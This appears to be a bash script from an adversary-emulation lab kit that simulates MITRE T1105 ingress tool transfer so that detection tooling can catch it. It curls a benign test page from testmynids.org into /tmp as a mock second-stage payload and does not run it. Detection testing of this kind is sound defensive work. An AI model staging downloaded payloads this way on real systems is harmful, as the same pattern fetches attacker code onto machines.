#!/usr/bin/env bash
# T1105 — Ingress tool transfer (download simulated second-stage)
# Derived verbatim from SIM-MP-001 step step-04 (../../mp-001-c2-beacon-ngfw-xdr-stitch.yml).
# LEGAL: run only in an authorized, isolated lab. See ../README.md.
set -u -o pipefail
echo "[SIM-MP-001/T1105] Ingress tool transfer (download simulated second-stage)"

echo '[MP-001] Staging: download of simulated second-stage payload';
curl -sSL -o /tmp/cortexsim_stage2.sh http://testmynids.org/uid/index.html;
ls -la /tmp/cortexsim_stage2.sh;
echo '[*] Not executed - just staged for BIOC detection'
